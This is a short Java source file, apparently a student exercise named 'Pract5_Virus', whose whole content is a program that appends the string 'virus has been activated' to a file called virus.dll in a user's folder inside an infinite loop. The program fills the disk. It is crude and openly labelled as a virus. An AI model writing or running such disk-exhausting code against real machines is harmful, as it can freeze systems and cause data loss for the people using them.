import java.io.FileWriter; 
import java.io.IOException;
public class Pract5_Virus
{
public static void main(String args[])
{
 
try
{
FileWriter fw=new FileWriter("c:/Users/Jyoti/virus.dll",true); 
while(true)
{
 
fw.write("virus has been activated");
}
}
catch(IOException e)
{
e.printStackTrace();
}
}
}
 













